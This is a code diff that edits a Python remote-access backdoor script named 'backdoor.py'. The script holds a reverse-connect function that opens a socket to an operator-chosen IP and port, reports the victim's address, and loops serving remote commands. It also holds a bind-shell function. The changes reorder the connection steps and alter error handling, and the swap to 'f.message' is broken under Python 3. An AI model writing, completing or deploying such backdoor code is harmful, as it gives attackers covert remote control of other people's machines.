@@ -20,12 +20,12 @@ Usage ./backdoor.py --c <Ip> <PORT>
 
 def rvrscnnct(ip,port):
     try:
-        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
-        a=output.stdout.read()
-        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
         rvrscnct=socket.socket()
         rvrscnct.connect((ip,int(port)))
         rvrscnct.settimeout(2)
+        output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
+        a=output.stdout.read()
+        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
         host=str.encode('[*] SESSION CREATED '+ip_candidates)
         rvrscnct.send(host)
         while True:
@@ -50,17 +50,18 @@ def rvrscnnct(ip,port):
             except socket.timeout:
                 pass
             except IOError as a :
-                print(a)
                 ioerror=str.encode("[-] Directory Not Found")
                 rvrscnct.send(ioerror)
                 pass
     except ConnectionRefusedError:
         print("[-] Connection error")
     except Exception as f:
-        print(f)
+        print(f.message)
     except KeyboardInterrupt:
         print("[-] The connection was forcibly closed")
-        rvrscnct.close()
+        try:
+            rvrscnct.close()
+        except UnboundLocalError:pass
         sys.exit(1)
 def bndcnnct(port):
     try:
@@ -96,12 +97,17 @@ def bndcnnct(port):
                 ioerror=str.encode("[-] Directory Not Found")
                 a.send(ioerror)
                 pass
+    except ConnectionRefusedError:
+        print("[-] Connection error")
     except Exception as f:
-        print(f)
+        print(f.message)
     
     except KeyboardInterrupt:
         print("[-] The connection was forcibly closed")
-        rvrscnct.close()
+        try:
+            a.close()
+        except UnboundLocalError:
+            pass
         sys.exit(1)
 
 if __name__=='__main__':
